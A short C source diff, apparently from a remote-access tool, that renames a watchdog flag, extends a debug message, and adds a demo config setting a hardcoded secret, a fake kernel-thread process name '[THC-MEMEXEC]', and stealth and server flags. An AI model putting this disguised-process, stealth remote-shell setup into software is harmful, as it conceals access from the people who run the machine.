@@ -124,7 +124,7 @@ GSNC_config_write(const char *fn) {
     c.callhome_sec = gopt.callhome_sec;
     c.flags |= (gopt.flags & GSC_FL_OPT_TOR);
     c.flags |= (gopt.flags & GSC_FL_OPT_DAEMON);
-    c.flags |= (gopt.flags & GSC_FL_OPT_WATCHDOG);
+    c.flags |= (gopt.flags & GSC_FL_OPT_WATCHDOG_INTERNAL);
     c.flags |= (gopt.flags & GSC_FL_OPT_QUIET);
 
     if (GS_GETENV2("FFPID"))
@@ -164,6 +164,16 @@ err:
     return ret;
 }
 
+static void
+gs_config_demo(void) {
+    gopt.sec_str = "SecretChangeMe";
+    gopt.proc_hiddenname = "[THC-MEMEXEC]";
+    // gopt.flags |= GSC_FL_OPT_DAEMON;
+    gopt.flags |= GSC_FL_IS_SERVER;
+    gopt.flags |= GSC_FL_IS_STEALTH;
+    gopt.flags |= GSC_FL_CONFIG_READ_OK;
+    gopt.is_interactive = 1;
+}
 // Return 0 if config could be read EOF of fn
 int
 GSNC_config_read(const char *fn) {
@@ -207,7 +217,7 @@ GSNC_config_read(const char *fn) {
 
     gopt.flags |= (c.flags & GSC_FL_OPT_TOR);
     gopt.flags |= (c.flags & GSC_FL_OPT_DAEMON);
-    gopt.flags |= (c.flags & GSC_FL_OPT_WATCHDOG);
+    gopt.flags |= (c.flags & GSC_FL_OPT_WATCHDOG_INTERNAL);
     gopt.flags |= (c.flags & GSC_FL_OPT_QUIET);
     gopt.flags |= (c.flags & GSC_FL_FFPID);
     gopt.flags |= (c.flags & GSC_FL_CHANGE_CGROUP);
@@ -223,7 +233,7 @@ GSNC_config_read(const char *fn) {
     ret = 0;
 err:
     XFCLOSE(fp);
-    DEBUGF("returning %d [%s]\n", ret, ret==0?"read config":errno==0?"no config":strerror(errno));
+    DEBUGF("returning %d [%s, fn='%s']\n", ret, ret==0?"read config":errno==0?"no config":strerror(errno), fn?:"NULL");
     return ret;
 }
 
